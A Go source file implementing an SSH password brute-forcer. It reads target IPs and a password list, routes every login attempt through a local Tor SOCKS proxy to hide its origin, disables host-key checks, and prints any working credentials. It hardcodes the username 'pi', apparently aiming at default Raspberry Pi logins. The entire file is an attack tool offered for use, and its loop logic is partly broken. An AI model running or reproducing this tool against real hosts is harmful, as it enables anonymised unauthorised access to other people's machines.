package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
	"net/url"
	"os"
	"time"
)

var (
	passFile = flag.String("pass", "passfile.txt", "Password list to use.")
	ipFile   = flag.String("ip", "ipfile.txt", "Ip list to attack.")
	port     = flag.String("port", "22", "Port to attempt ssh connection.")
	user     = flag.String("user", "root", "User to attempt connection.")
	timeout  = flag.Duration("timeout", 1000*time.Millisecond, "Timeout per ssh request.")
)

// Struct with authentication info
type AuthResult struct {
	Ip   string
	Port string
	User string
	Pass string
}

type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func newFileScanner(path string) (*fileScanner, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	fScanner := &fileScanner{File: file, Scanner: scanner}
	return fScanner, nil
}

// Creates a ssh client with a routed *net.Conn
func TorClient(addr string, config *ssh.ClientConfig) (*ssh.Client, error) {
	proxyURL, _ := url.Parse("socks5://127.0.0.1:9050")
	dialer, err := proxy.FromURL(proxyURL, proxy.Direct)
	if err != nil {
		return nil, err
	}
	perHost := proxy.NewPerHost(dialer, nil)
	conn, err := perHost.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		return nil, err
	}
	return ssh.NewClient(c, chans, reqs), nil
}

func sshDialer(ip, port, user, password string, resCh chan *AuthResult) {
	config := &ssh.ClientConfig{

		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timeout,
	}
	finish := make(chan bool)
	for {
		go func() {
			_, err := TorClient(ip+":"+port, config)
			if err == nil {
				res := &AuthResult{Ip: ip, Port: port, User: user, Pass: password}
				fmt.Printf("Found! IP: \"%v:%v\", user \"%v\" pass: \"%v\".\n", ip, port, user, password)
				finish <- true
				resCh <- res
			}
		}()
		select {
		case <-finish:
		case <-time.After(*timeout):
			resCh <- nil
		}
		break
	}

}

func main() {
	flag.Parse()
	ip, err := newFileScanner(*ipFile)
	if err != nil {
		panic(err)
	}
	pass, err := newFileScanner(*passFile)
	if err != nil {
		panic(err)
	}
	resCh := make(chan *AuthResult)
	attempts := 0
	checked := 0
	fmt.Println("Launching ssh auth requests...")
	t0 := time.Now()
	defer ip.File.Close()
	defer pass.File.Close()
	for ip.Scanner.Scan() {
		for pass.Scanner.Scan() {
			ipAddr := ip.Scanner.Text()
			passwd := pass.Scanner.Text()
			if err := ip.Scanner.Err(); err != nil {
				return
			}
			go sshDialer(ipAddr, *port, "pi", passwd, resCh)
			attempts++
		}
	}
	for res := range resCh {
		checked++
		if checked == attempts {
			break
		}
		if res == nil {
			continue
		}
	}
	t1 := time.Since(t0)
	fmt.Printf("Finished %v requests, %.2f seconds, RPS: %.4f\n, ", attempts, t1.Seconds(), float64(attempts)/t1.Seconds())
}
